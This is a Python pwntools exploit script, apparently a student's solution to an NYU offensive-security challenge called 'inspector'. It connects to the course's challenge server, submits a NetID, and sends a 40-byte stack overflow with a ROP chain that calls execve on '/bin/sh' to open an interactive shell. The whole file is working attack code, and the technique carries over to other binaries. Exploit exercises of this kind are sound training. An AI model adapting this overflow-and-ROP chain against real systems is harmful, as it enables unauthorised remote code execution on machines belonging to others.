#!/usr/bin/env python3

from pwn import *

#context.log_level = "DEBUG"

# Length of characters needed to reach return address on stack (for overwrite)
OFFSET = 40

# Local process for local testing with gdb attach
'''p = process("./inspector.htm")
g = gdb.attach(p, gdbscript="""
	b *(main+40)
	c
	x/g 0x400708
	x/60x $rsp
	""",
)'''

# Create connection to challenge server and submit NetID when prompted
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)
p.recvuntil(b"something like abc123): ")
p.send(b"aal562\n")

# Receive binary prompt "Please pop a shell!"
p.recvuntil(b"shell!\n")

# Create ELF and ROP insatances to pull useful addresses for payload
e = ELF("./inspector.htm")
r = ROP("./inspector.htm")

# Pull address of "/bin/sh" string, found as useful_string variable in binary, no PIE enabled
bin_sh_addr = e.symbols["useful_string"]
bin_sh_addr = bin_sh_addr.to_bytes(8, 'little')

# 0 and 59 to be converted to hex for our payload
fifty_nine = 59
zero = 0

# Build our arguments for syscall: syscall(SYS_execev, "/bin/sh", 0, 0)
rop_chain = r.rdi.address.to_bytes(8, 'little')		# pop rdi, ret
rop_chain += bin_sh_addr				# address for "/bin/sh" string within the binary
rop_chain += r.rsi.address.to_bytes(8, 'little')	# pop rsi, ret
rop_chain += zero.to_bytes(8, 'little')			# null bytes, second argument is unimportant
rop_chain += r.rdx.address.to_bytes(8, 'little')	# pop rdx, ret
rop_chain += zero.to_bytes(8, 'little')			# null bytes, third argument is unimportant
rop_chain += r.rax.address.to_bytes(8, 'little')	# pop rax, ret
rop_chain += fifty_nine.to_bytes(8, 'little')		# first arg to syscall, 59 for SYS_execev
rop_chain += r.syscall.address.to_bytes(8, 'little')	# address of syscall in gadget_1 to actually perform syscall()

# Combine elements and send our payload	
payload = b"".join(
	[
		b"\x00" * OFFSET,
		rop_chain,
		b"\n",
	]
)
p.send(payload)

# Make interactive to utilize our new shell
p.interactive()
#pause()
